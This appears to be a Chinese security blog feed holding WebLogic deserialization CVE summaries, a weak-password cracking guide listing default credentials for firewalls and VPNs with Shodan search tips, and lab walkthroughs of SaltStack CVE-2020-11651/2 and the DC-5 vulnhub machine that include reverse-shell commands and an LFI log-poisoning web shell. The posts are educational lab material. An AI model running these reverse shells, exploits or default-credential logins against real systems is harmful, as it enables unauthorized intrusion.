<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStreamweblogic.rjvm.MsgAbbrevInputStream.class   weblogic.iiop.Utils.class</span><br></pre></td></tr></table></figure>

<p>所以如果能找到可以在其readObject中创建自己的InputStream的对象，并且不是使用黑名单中的ServerChannelInputStream和MsgAbbrevInputStream的readExternal进行的反序列化，最后调用readObject()方法进行反序列化的数据的读取，这样就可以执行含有恶意代码的序列化代码。CVE-2016-0638漏洞就是依据这个思路找到了weblogic.jms.common.StreamMessageImpl类，其中的readExternal()方法也符合攻击的需求。攻击者可以在其中构造一个恶意的ObjectInputStream来实现payload内部的InputStream创建，调用readObject()方法实现攻击。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6、12.1.2、12.1.3和12.2.1</p>
<h1 id="CVE-2016-3510-JAVA反序列化"><a href="#CVE-2016-3510-JAVA反序列化" class="headerlink" title="CVE-2016-3510 JAVA反序列化"></a>CVE-2016-3510 JAVA反序列化</h1><p>漏洞概述：</p>
<p>此漏洞是与CVE-2016-0638漏洞利用方式相似,只是选择了weblogic.corba.utils.MarshalledObject进行绕过,绕过之前的CVE-2015-4852和CVE-2016-0638漏洞的修复补丁。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0、12.1.3.0和12.2.1.0</p>
<h1 id="CVE-2017-3248-JAVA反序列化"><a href="#CVE-2017-3248-JAVA反序列化" class="headerlink" title="CVE-2017-3248 JAVA反序列化"></a>CVE-2017-3248 JAVA反序列化</h1><p>漏洞概述：</p>
<p>CVE-2017-3248漏洞利用方法与之前三个漏洞不同,这次主要是利用了JRMPJava远程方法协议。利用java.rmi.registry.Registry,序列化RemoteObjectInvocationHandler,并使用UnicastRef和远端建立tcp连接,获取RMIregistry,最终将加载的内容利用readObject()进行解析,导致之前序列化的恶意代码执行。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0、12.1.3.0、12.2.1.0和12.2.1.1</p>
<h1 id="CVE-2018-2628-JAVA反序列化"><a href="#CVE-2018-2628-JAVA反序列化" class="headerlink" title="CVE-2018-2628 JAVA反序列化"></a>CVE-2018-2628 JAVA反序列化</h1><p>漏洞概述：</p>
<p>CVE-2018-2628漏洞与CVE-2017-3248漏洞利用方法类似,仅仅更换了使用的rmi接口,用java.rmi.activation.Activator替换了CVE-2017-3248所使用的java.rmi.registry.Registry,从而绕过resolveProxyClass的判断,成功绕过了CVE-2017-3248漏洞的修复补丁,其他攻击流程相同。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3</p>
<h1 id="CVE-2018-2893-JAVA反序列化"><a href="#CVE-2018-2893-JAVA反序列化" class="headerlink" title="CVE-2018-2893 JAVA反序列化"></a>CVE-2018-2893 JAVA反序列化</h1><p>漏洞描述：</p>
<p>CVE-2018-2893漏洞，同样是对resolveProxyClass函数进行绕过，导致攻击者可以利用UnicastRef和远端建立tcp连接，获取RMI registry，再将加载的内容利用readObject解析，从而造成反序列化远程代码执行。</p>
<p>CVE-2018-2893漏洞绕过方式是利用StreamMessageImpl对ysoserial工具中的JRMPClient生成的payloadObject进行封装，由于StreamMessageImpl在进行反序列化时并不会被resolveProxyClass检测，导致绕过的产生，最后成功的进行了反序列化攻击。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3</p>
<p>1</p>
<hr>
<h1 id="CVE-2017-3506-XMLDecoder反序列化"><a href="#CVE-2017-3506-XMLDecoder反序列化" class="headerlink" title="CVE-2017-3506 XMLDecoder反序列化"></a>CVE-2017-3506 XMLDecoder反序列化</h1><p>漏洞描述：</p>
<p>Oracle融合中间件(子组件：Web服务)的Oracle WebLogic Server组件中的漏洞。难以攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。对此漏洞的成功攻击可能导致对关键数据或所有Oracle WebLogic Server可访问数据的未经授权的创建、删除或修改访问，以及对关键数据的未经授权访问或对所有Oracle WebLogic Server可访问数据的完全访问。</p>
<p>影响版本：</p>
<p> WebLogic 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1和12.2.1.2</p>
<h1 id="CVE-2017-10271-XMLDecoder反-序列化"><a href="#CVE-2017-10271-XMLDecoder反-序列化" class="headerlink" title="CVE-2017-10271 XMLDecoder反 序列化"></a>CVE-2017-10271 XMLDecoder反 序列化</h1><p>漏洞描述：</p>
<p>Oracle融合中间件的Oracle WebLogic Server组件中的漏洞(子组件：WLS安全性)。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。</p>
<p>影响版本：</p>
<p> WebLogic 10.3.6.0.0、12.1.3.0.0、12.2.1.1.0和12.2.1.2.0</p>
<h1 id="CVE-2019-2725-XMLDecoder反序列化"><a href="#CVE-2019-2725-XMLDecoder反序列化" class="headerlink" title="CVE-2019-2725 XMLDecoder反序列化"></a>CVE-2019-2725 XMLDecoder反序列化</h1><p>漏洞描述：</p>
<p>WebLogic Admin Server的两个组件（wls9_async_response.war 和 wls-wsat.war）可以在无身份认证无授权的情况下，攻击者可以发送精心构造的恶意HTTP请求，在未认证情况下达到远程执行代码的效果</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0.0和12.1.3.0.0</p>
<h1 id="CVE-2019-2729-XMLDecoder反序列化"><a href="#CVE-2019-2729-XMLDecoder反序列化" class="headerlink" title="CVE-2019-2729 XMLDecoder反序列化"></a>CVE-2019-2729 XMLDecoder反序列化</h1><p>漏洞描述：</p>
<p>和CVE-2019-2725相似，在修复反序列化漏洞所使用黑明单方式补丁找到了新的绕过方法，从而导致在之前的漏洞利用点依然能通过反序列化的方式来执行代码。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0.0、12.1.3.0.0和12.2.1.3.0</p>
<hr>
<h1 id="CVE-2020-2546-RCE"><a href="#CVE-2020-2546-RCE" class="headerlink" title="CVE-2020-2546 RCE"></a>CVE-2020-2546 RCE</h1><p>漏洞描述：</p>
<p>该漏洞通过T3协议实现利用、攻击者可通过此漏洞实现远程代码执行。</p>
<p>影响版本：</p>
<p>WebLogic Server 10.3.6.0.0 、WebLogic Server 12.1.3.0.0</p>
<h1 id="CVE-2020-2551-RCE"><a href="#CVE-2020-2551-RCE" class="headerlink" title="CVE-2020-2551 RCE"></a>CVE-2020-2551 RCE</h1><p>漏洞描述：</p>
<p>该漏洞可以绕过Oracle官方在2019年10月份发布的最新安全补丁。攻击者可以通过IIOP协议远程访问Weblogic Server服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码。IIOP协议以Java接口的形式对远程对象进行访问，默认启用。</p>
<p>影响版本：</p>
<p> WebLogic 10.3.6.0.0 、12.1.3.0.0 、12.2.1.3.0 、12.2.1.4.0</p>
<h1 id="CVE-2020-2551-IIOP反序列化漏洞"><a href="#CVE-2020-2551-IIOP反序列化漏洞" class="headerlink" title="CVE-2020-2551 IIOP反序列化漏洞"></a>CVE-2020-2551 IIOP反序列化漏洞</h1><p>漏洞描述：</p>
<p>从Oracle 官方的CPU公告中可以看出该漏洞存在于weblogic核心组件，影响的协议为IIOP。其实经过分析发现，该漏洞原理上类似于RMI反序列化漏洞（CVE-2017-3241），和之前的T3协议所引发的一系列反序列化漏洞也很相似，都是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，并没有进行安全检查所导致的。</p>
<p>影响版本：</p>
<p> WebLogic 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、 12.2.1.4.0</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
  </entry>
  <entry>
    <title>web漏洞利用之弱口令</title>
    <url>/2020/05/14/web%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    <content><![CDATA[<p><strong>转载:<a href="https://mp.weixin.qq.com/s/hCX447Kb2RE_ORMjk0wXnQ">https://mp.weixin.qq.com/s/hCX447Kb2RE_ORMjk0wXnQ</a></strong></p>
<h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>​     弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的计算机面临风险，因此不推荐用户使用。</p>
<p>​    近些年来有关信息泄露的事件层出不穷，其中有相当部分是因为弱口令引起的。2015年春运前夕，有网友在“乌云-漏洞报告平台”发表一篇帖子称，大量12306用户数据在互联网传播售卖，传闻黑客是通过“撞库”获取的12306用户数据。以下是安全爱好者对12306泄露密码的统计结果：</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/1.png">

<p>​    弱口令产生的原因在于个人安全意识不够强，比如为了方便记忆直接将密码设定为一组简单数字组合（123456），或者设置为自己的生日及直接采用系统默认密码等。在当前绝大部分信息系统都以账户和密码鉴权登录的情况下，通过这些简单的弱口令，攻击者可以直接获取系统控制权限。</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/2.png">

<p>​    系统的弱口令是常见的渗透入口点之一，不论是web还是如VPN、堡垒机、边界路由器防火墙一类，以及结合特定公司场景、业务场景生成的弱口令的情况。通过登录用户上传webshell 获取读取敏感信息、注册用户信息甚至获取到系统shell的情况，可能会造成更大的风险。</p>
<h2 id="二、弱口令字典生成"><a href="#二、弱口令字典生成" class="headerlink" title="二、弱口令字典生成"></a>二、弱口令字典生成</h2><p>​    有很多人为了方便记忆自己的密码，经常将个人身份信息嵌入其中。如果是对某用户有一定的了解，通过收集用户信息，包括生日，手机号，用户名，车牌号，网站名称，地址等（包含中文信息可以使用拼音），可以通过暴力破解的方式尝试出用户密码。而且绝大多数人都会将多个账户设定为相同的密码，即如果你破解了某人的QQ密码，很可能你也找到了他的论坛、邮箱、微博、游戏账号密码……</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/3.png">

<p>当针对某个公司&amp;团体生成弱口令字典时，可以在从一些网站收集相关信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全国社会组织查询</span><br><span class="line">http://www.chinanpo.gov.cn/search/orgindex.html</span><br><span class="line">天眼查-商业安全工具_企业信息查询_公司查询_工商查询_企业信用信息系统</span><br><span class="line">https://www.tianyancha.com/</span><br><span class="line">工业和信息化部ICP/IP地址/域名信息备案管理系统</span><br><span class="line">http://www.beian.miit.gov.cn/publish/query/indexFirst.action</span><br></pre></td></tr></table></figure>

<p>   类似这样的网站还有很多</p>
<p>​    另外现在越来越多的后台弱口令使用@、*、&amp;以及.等特殊字符作为增强密码复杂度的手段，虽然增加了爆破成本但是依然有规律可循。比如test@公司名或者当年年份@公司名，可以使用字典生成器来有针对性的生成字典。（白鹿社工字典生成器——<a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool%EF%BC%89">https://github.com/HongLuDianXue/BaiLu-SED-Tool）</a></p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/4.png">

<p>​    比如admin@huawei，可以将上述密码构成分为3项：信息项、符号项、弱字符串项。</p>
<p>​    其中，信息项为和目标有关的信息，如：Admin、Huawei等；符号项为：密码组合中会用到的符号，如：空格、@、_、!、#、$等；弱字符项为：密码组合中常用到的“弱口令”字符串，如：123、001、abc、2012等。“A项”输入框：初始内容为空，需自行输入前面所提到的社工弱口令的“信息项”；此外该工具还有“结果去重”选择框：勾选此项将会对最终生成的字典文件执行去除重复行操作。</p>
<h2 id="三、弱口令密码爆破"><a href="#三、弱口令密码爆破" class="headerlink" title="三、弱口令密码爆破"></a>三、弱口令密码爆破</h2><h4 id="1、-最常见的弱口令检测方法：使用Burp的intruder模块"><a href="#1、-最常见的弱口令检测方法：使用Burp的intruder模块" class="headerlink" title="1、 最常见的弱口令检测方法：使用Burp的intruder模块"></a>1、 最常见的弱口令检测方法：使用Burp的intruder模块</h4><p>​    先使用代理模式抓包，然后右键选择Send to Intruder</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/5.png">

<p>​    在Intruder模式中设置密码变量（假定已知管理员账户为admin，同时也可锁定密码爆破用户名，或者同时跑用户名&amp;密码字典）</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/6.png">    

<p>在payloads选项卡中选择load选择密码路径，加载密码字典。然后点击右上角的start attack开始尝试爆破admin账户密码<br><img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/7.png">    根据返回包长度的不同，发现admin账户的弱口令密码为admin</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/8.png">

<p>​    此外还有爆破SSH，FTP等弱口令的工具，使用方法大同小异，前段时间写过一篇爆破SSH的文章，感兴趣的可以看一下</p>
<h4 id="2、超级弱口令检查工具"><a href="#2、超级弱口令检查工具" class="headerlink" title="2、超级弱口令检查工具"></a>2、超级弱口令检查工具</h4><p><a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p>
<p>​    这是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。</p>
<p>​    首先选择需要检查的服务（可多选），然后在目标处输入检查的IP、域名或IP范围，可以是单个IP或IP段，IP范围格式必须为：192.168.1.1-192.168.200.1、192.168.1.1-192.168.1.200。也可导入地址，导入地址必须是单个IP一行，然后可设置账户字典或密码字典，可以选择字典文件，也可自己填写单个账户或密码，其他选项根据需求选择，点开始即可检查。</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/9.png">

<h4 id="3、web-pwd-common-crack"><a href="#3、web-pwd-common-crack" class="headerlink" title="3、web_pwd_common_crack"></a>3、web_pwd_common_crack</h4><p>   我们团队大佬开发的web通用弱口令破解脚本，旨在批量检测那些没有验证码的管理后台</p>
<p>项目地址:<br><code>https://github.com/TideSec/web_pwd_common_crack</code><br>安装方式<br>从Github上拖下来:<br><code>git clone https://github.com/TideSec/web_pwd_common_crack</code><br>安装requirements.txt依赖<br><code>pip install -r requirements.txt</code></p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/10.png">

<p>   运行脚本即可</p>
<p>  python web_pwd_crack.py url.txt 50</p>
<p>   url.txt为待检测URL地址，可以自己写个脚本批量从搜索引擎获取，也可以自己用目录枚举工具去搜集，50为线程数，默认为50。</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/11.png">

<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/12.png">



<p>4、 以下为常见不同的后台类型的弱密码：</p>
<p>   数据库（phpmyadmin）：账号：root，密码：root、root123、123456</p>
<p>   tomcat：账号：admin、tomcat、manager，密码：admin、tomcat、admin123、123456、manager</p>
<p>   jboss：账号：admin、jboss、manager，密码：admin、jboss、manager、123456</p>
<p>   weblogic：账号：weblogic、admin、manager，密码：weblogic、admin、manager、123456</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/13.png">

<p>5、安全设备弱口令（网上大佬分享的设备弱口令）</p>
<p>​    天融信防火墙，不需要证书 登录地址:<a href="https://192.168.1.254/">https://192.168.1.254</a> 用户名:superman 密码:talent 技术支持热线：8008105119</p>
<p>​    天融信防火墙，不需要证书 登录地址:<a href="https://192.168.1.254：8080">https://192.168.1.254：8080</a> 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存</p>
<p>​    联想网御防火墙，需要证书（最好用IE浏览器登录）登录地址:<a href="https://10.1.5.254:8889/">https://10.1.5.254:8889</a> 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</p>
<p>​    深信服防火墙（注安全设备管理地址不是唯一的） <a href="https://10.251.251.251https//10.254.254.254">https://10.251.251.251https://10.254.254.254</a> 用户名：admin 密码：admin 技术支持热线：4006306430</p>
<p>​    启明星辰 <a href="https://10.1.5.254:8889/">https://10.1.5.254:8889</a> 用户名：admin 密码：bane@7766 <a href="https://10.50.10.45:8889/">https://10.50.10.45:8889</a> 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</p>
<p>​    juniper 登录地址:<a href="https://192.168.1.1/">https://192.168.1.1</a> 用户名:netscreen 密码:netscreen</p>
<p>​    Cisco 登录地址:<a href="https://192.168.0.1/">https://192.168.0.1</a> 用户名:admin 密码:cisco</p>
<p>​    Huawei 登录地址:<a href="http://192.168.0.1/">http://192.168.0.1</a> 用户名:admin 密码:Admin@123</p>
<p>​    H3C 登录地址:<a href="http://192.168.0.1/">http://192.168.0.1</a> 用户名:admin 密码:admin 技术支持热线：4006306430</p>
<p>​    绿盟IPS <a href="https://192.168.1.101/">https://192.168.1.101</a> 用户名: weboper 密码: weboper 配置重启生效</p>
<p>​    网神防火墙GE1口 <a href="https://10.50.10.45/">https://10.50.10.45</a> 用户名：admin 密码：firewall 技术支持热线：4006108220</p>
<p>​    深信服VPN：51111端口 delanrecover</p>
<p>​    华为VPN：账号：root 密码：mduadmin</p>
<p>​    华为防火墙：admin Admin@123 eudemon</p>
<p>​    eudemon Juniper防火墙：netscreen netscreen</p>
<p>​    迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</p>
<p>​    山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</p>
<p>​    安恒的明御防火墙 admin/adminadmin</p>
<p>​    某堡垒机 shterm/shterm</p>
<p>​    天融信的vpn test/123456</p>
<p>如何寻找网络上的这些设备</p>
<p> （1）<a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<p>​    Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备</p>
<p>​    例如搜索位于南京的海康威视网络摄像头：Hikvision-Webs country:”CN” city:”Nanjing”</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/14.png">

<p>​    根据ip地址访问后可尝试弱口令登陆</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/15.png">

<p>  （2）钟馗之眼</p>
<p>​     <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/16.png">

<p>​     例如搜索weblogic服务器：app:”Oracle WebLogic Server”</p>
<img src="https://ckcah.github.io/images/web漏洞-弱口令src挖掘/17.png">

<h2 id="四、加固建议"><a href="#四、加固建议" class="headerlink" title="四、加固建议"></a>四、加固建议</h2><p>   防止弱口令的一些方法：</p>
<p>​    不使用空口令或系统缺省的口令，因为这些口令很容易被攻击者进入甚至不需要任何成本，为典型的弱口令。</p>
<p>​    设置高长度&amp;高复杂度字符口令。</p>
<p>​    口令不要设置连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（123123）。</p>
<p>​    口令使用复杂组合，如大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。</p>
<p>​    口令中尽量不要包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail地址等等与本人有关的信息，以及字典中的单词。</p>
<p>​    口令不应该为用数字或符号代替某些字母的单词。</p>
<p>​    定期更换口令。</p>
<p>  关于如何防止暴力攻击的一些方法：</p>
<p>   限制验证次数，或者设置较长的密码和各种组合，延长暴力破解的时间。</p>
<p>   尽可能的使密码足够的复杂。</p>
<p>   发现同一IP错误登录次数过多时，进行其他验证或者封锁IP。</p>
<p>   如果错误次数超过五次或者十次以上，那么就采用验证码登录，或者使用短信验证，设置有限的验证次数。</p>
<p>   可以添加延迟来延长暴力破解的时间，这样可以减缓一些单线程攻击，但对多线程攻击则效果不好。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>SRC</tag>
        <tag>弱口令</tag>
        <tag>shodan</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-11651/2实战</title>
    <url>/2020/05/14/CVE-2020-11651-2%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p><strong>实验环境:<a href="http://www.hetianlab.com/expc.do?ce=13cbbaf6-2037-4925-ba09-6c97bd1f6a3b">http://www.hetianlab.com/expc.do?ce=13cbbaf6-2037-4925-ba09-6c97bd1f6a3b</a></strong></p>
<p>先获取ip地址网段<img src="https://ckcah.github.io/images/CVE-2020-11651/1.png"></p>
<p>再扫描一下本网段</p>
<img src="https://ckcah.github.io/images/CVE-2020-11651/2.png">



<p>SaltStack应用默认绑定的端口是4505,4506</p>
<p>那就直接nmap扫描这两个端口</p>
<img src="https://ckcah.github.io/images/CVE-2020-11651/3.png">

<p>确实是打开的</p>
<p>接下来，就是对端口进行漏洞检测</p>
<p>先获取工具，解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://tools.hetianlab.com/tools/CVE-2020-11651.zip</span><br><span class="line">unzip  CVE-2020-11651.zip</span><br></pre></td></tr></table></figure>

<p>或者直接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jasperla/CVE-2020-11651-poc.git</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/CVE-2020-11651/4.png">



<p>利用exploit检测</p>
<p><code>python3 exploit.py --master 10.1.1.137</code></p>
<img src="https://ckcah.github.io/images/CVE-2020-11651/5.png">

<p>成功读取到了“root key”，说明存在漏洞。</p>
<p>在CVE-2020-11652目录遍历漏洞中，攻击者通过构造恶意请求，读取服务器上任意文件。比如/etc/passwd</p>
<img src="https://ckcah.github.io/images/CVE-2020-11651/6.png">



<p>再或者</p>
<p>CVE-2020-11651认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过Salt Master的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。</p>
<p>先反弹一个shell回来，在kali上监听一个端口</p>
<p>nc -lvvp 1234</p>
<p>执行脚本</p>
<p>python3 exploit.py –master 10.1.1.137 –exec ‘bash -i &gt;&amp; /dev/tcp/10.1.1.135/1234 0&gt;&amp;1’</p>
<img src="https://ckcah.github.io/images/CVE-2020-11651/7.png">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/CVE-2020-11651/8.png">

<p>ok</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>目录遍历</tag>
        <tag>远程命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5</title>
    <url>/2020/05/14/DC-5%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    <content><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn 192.168.114.0/24</span><br><span class="line"></span><br><span class="line">nmap -A -T 4 192.168.114.146</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/.io//Blog\blog\source\images\DC-5\1.png" alt="image-20200514054055039"></p>
<p>特地查了一下rpcbind，大概是将RPC服务映射到其侦听的端口的服务，和DNS类似。</p>
<p><strong>rpcbind [3]实用程序将RPC服务映射到其侦听的端口。RPC进程在启动时会通知rpcbind，注册正在侦听的端口以及期望使用的RPC程序号。然后，客户端系统使用特定的RPC程序服务器与服务器上的rpcbind联系。rpcbind服务重新设置客户端重定向到正确的端口号，刹车它可以与请求的服务进行通信</strong></p>
<p>80端口也是打开的，先试试从80端口入手</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\2.png" alt="image-20200514054437764"></p>
<p>wappalyzer只检测出它是php编写的，以及服务器是nginx。</p>
<p>访问contact的时候，发现有一个留言功能，或许可以试试xss</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\3.png" alt="image-20200514054556665"></p>
<p>burp跑了字典，不行</p>
<p>试试跑目录，什么都没跑出来</p>
<p>sql注入，试了几个原始头参数，没用</p>
<p>实在没办法了，还是乖乖的去看<a href="https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/">大佬</a>文章学知识吧</p>
<p>作者提到，当我们提交contact表单时，下边的logo会从2019变成2020</p>
<p>未提交前：</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\4.png" alt="image-20200514064408110"></p>
<p>提交后：</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\5.png" alt="image-20200514064453517"></p>
<p>测试了很久发现是LFI漏洞</p>
<p>其实首页就已经提示了是本地文件包含漏洞</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\6.png" alt="image-20200514064800357"></p>
<p>用/etc/passwd测试，存在LFI漏洞</p>
<p>按理来说，像数据库日志文件，登陆日志文件，访问日志文件，linux的话，都在/var下，那就直接去看看access文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.114.133/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="/.io//Blog\blog\source\images\DC-5\7.png" alt="image-20200514065353784"></p>
<p>学到一个新知识</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\8.png" alt="image-20200514065332937"></p>
<p>这样插入一句话木马的，我还是第一次见</p>
<p>提交成功</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\9.png" alt="image-20200514065419432"></p>
<p>验证一下cmd是否可以执行，给cmd一个parameter，用**&amp;cmd=id**</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\10.png" alt="image-20200514065734341"></p>
<p>全局搜索一下<code>uid</code></p>
<p><img src="/.io//Blog\blog\source\images\DC-5\11.png" alt="image-20200514065546988"></p>
<p>请出<code>netcat </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.114.1 1234</span><br><span class="line"></span><br><span class="line">192.168.114.1为攻击机IP地址</span><br></pre></td></tr></table></figure>

<p><img src="/.io//Blog\blog\source\images\DC-5\12.png" alt="image-20200514070835769"></p>
<p>再在本地执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>



<p>奇怪的是，我在windows下怎么做都不成功</p>
<p>所以只好切换成kali</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\13.png" alt="image-20200514071554470"></p>
<p>然后</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\14.png" alt="image-20200514071803007"></p>
<p>不太知道这是什么，查了下</p>
<p><strong>2&gt;/dev/null</strong></p>
<p>2是错误输出</p>
<p>/dev/null 代表 linux 的空设备文件</p>
<p>2&gt;/dev/null 意思就是把错误输出到“黑洞” ，也就是空文件中</p>
<p>锁定目标screen-4.5.0，我的理解是个程序之类的东西，</p>
<p>kali自带漏洞搜索，那就查查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit screen</span><br></pre></td></tr></table></figure>

<p><img src="/.io//Blog\blog\source\images\DC-5\15.png" alt="image-20200514072553731"></p>
<p><img src="/.io//Blog\blog\source\images\DC-5\16.png" alt="image-20200514072616966"></p>
<p><img src="/.io//Blog\blog\source\images\DC-5\17.png" alt="image-20200514072646869"></p>
<p>接下来就是漏洞利用</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\18.png" alt="image-20200514072742399"></p>
<p>好像不太行得通</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\19.png" alt="image-20200514073252130"></p>
<p>试试另一个41154.sh</p>
<p><img src="/.io//Blog\blog\source\images\DC-5\20.png" alt="image-20200514073444042"></p>
<p>提权未成功</p>
<p>再议</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>要细心观察每一个地方的变化</p>
